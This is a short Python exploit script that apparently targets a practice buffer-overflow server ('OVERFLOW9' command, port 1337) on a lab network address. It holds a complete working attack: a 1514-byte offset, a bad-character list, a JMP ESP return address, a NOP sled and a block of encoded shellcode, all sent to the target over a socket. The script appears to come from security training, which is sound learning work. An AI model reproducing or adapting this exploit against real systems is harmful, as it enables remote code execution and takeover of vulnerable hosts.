#!/usr/bin/python3

import struct, sys, socket

host = '10.10.69.86'
port = 1337

# [*] Exact match at offset 1514
# Badchars: 00 0a 0d 04 05 3e 3f e1 e2
# Removed: 00 0a 0d 04 3e 3f e1

buf =  b""
buf += b"\xba\xae\x9b\x33\x98\xda\xc2\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\xfe\x95\xd1"
buf += b"\x6d\x02\x41\x97\x8e\xfa\x92\xf8\x07\x1f\xa3\x38\x73"
buf += b"\x54\x94\x88\xf7\x38\x19\x62\x55\xa8\xaa\x06\x72\xdf"
buf += b"\x1b\xac\xa4\xee\x9c\x9d\x95\x71\x1f\xdc\xc9\x51\x1e"
buf += b"\x2f\x1c\x90\x67\x52\xed\xc0\x30\x18\x40\xf4\x35\x54"
buf += b"\x59\x7f\x05\x78\xd9\x9c\xde\x7b\xc8\x33\x54\x22\xca"
buf += b"\xb2\xb9\x5e\x43\xac\xde\x5b\x1d\x47\x14\x17\x9c\x81"
buf += b"\x64\xd8\x33\xec\x48\x2b\x4d\x29\x6e\xd4\x38\x43\x8c"
buf += b"\x69\x3b\x90\xee\xb5\xce\x02\x48\x3d\x68\xee\x68\x92"
buf += b"\xef\x65\x66\x5f\x7b\x21\x6b\x5e\xa8\x5a\x97\xeb\x4f"
buf += b"\x8c\x11\xaf\x6b\x08\x79\x6b\x15\x09\x27\xda\x2a\x49"
buf += b"\x88\x83\x8e\x02\x25\xd7\xa2\x49\x22\x14\x8f\x71\xb2"
buf += b"\x32\x98\x02\x80\x9d\x32\x8c\xa8\x56\x9d\x4b\xce\x4c"
buf += b"\x59\xc3\x31\x6f\x9a\xca\xf5\x3b\xca\x64\xdf\x43\x81"
buf += b"\x74\xe0\x91\x06\x24\x4e\x4a\xe7\x94\x2e\x3a\x8f\xfe"
buf += b"\xa0\x65\xaf\x01\x6b\x0e\x5a\xf8\xfc\x3b\x90\x11\xa4"
buf += b"\x53\xa4\x15\x56\xf4\x21\xf3\x3c\xe4\x67\xac\xa8\x9d"
buf += b"\x2d\x26\x48\x61\xf8\x43\x4a\xe9\x0f\xb4\x05\x1a\x65"
buf += b"\xa6\xf2\xea\x30\x94\x55\xf4\xee\xb0\x3a\x67\x75\x40"
buf += b"\x34\x94\x22\x17\x11\x6a\x3b\xfd\x8f\xd5\x95\xe3\x4d"
buf += b"\x83\xde\xa7\x89\x70\xe0\x26\x5f\xcc\xc6\x38\x99\xcd"
buf += b"\x42\x6c\x75\x98\x1c\xda\x33\x72\xef\xb4\xed\x29\xb9"
buf += b"\x50\x6b\x02\x7a\x26\x74\x4f\x0c\xc6\xc5\x26\x49\xf9"
buf += b"\xea\xae\x5d\x82\x16\x4f\xa1\x59\x93\x6f\x40\x4b\xee"
buf += b"\x07\xdd\x1e\x53\x4a\xde\xf5\x90\x73\x5d\xff\x68\x80"
buf += b"\x7d\x8a\x6d\xcc\x39\x67\x1c\x5d\xac\x87\xb3\x5e\xe5"

shellcode = buf

eip_jmp = struct.pack('<I', 0x625011EB)

nop = b'\x90' * 8

payload = b'OVERFLOW9 ' + b'A' * 1514 + eip_jmp + nop +  shellcode


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	s.send(payload)
	s.close()

except:
	raise Exception("Unable to connect to target server..")
	sys.exit()
